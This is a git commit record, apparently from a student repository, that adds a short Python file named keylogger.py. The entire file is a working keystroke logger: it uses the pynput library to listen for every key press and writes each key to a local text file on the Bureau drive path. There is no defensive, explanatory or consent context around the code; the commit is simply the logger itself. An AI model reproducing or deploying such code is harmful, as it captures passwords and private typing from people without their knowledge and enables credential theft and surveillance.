f3725e48405b2a9dedcd5140ecc21fa4722c461a
hans <jerome.arn@heig-vd.ch>
2019-02-08 12:47:24 +0100

    V1.0

---
+++ keylogger.py
@@ -0,0 +1,11 @@
+
+from pynput.keyboard import Key, Listener
+import logging
+
+logging.basicConfig(filename=("X:/Bureau/keylog.txt"), level=logging.INFO, format='%(message)s')
+
+def on_press(key):
+    logging.info(key)
+
+with Listener(on_press = on_press) as listener:
+    listener.join()
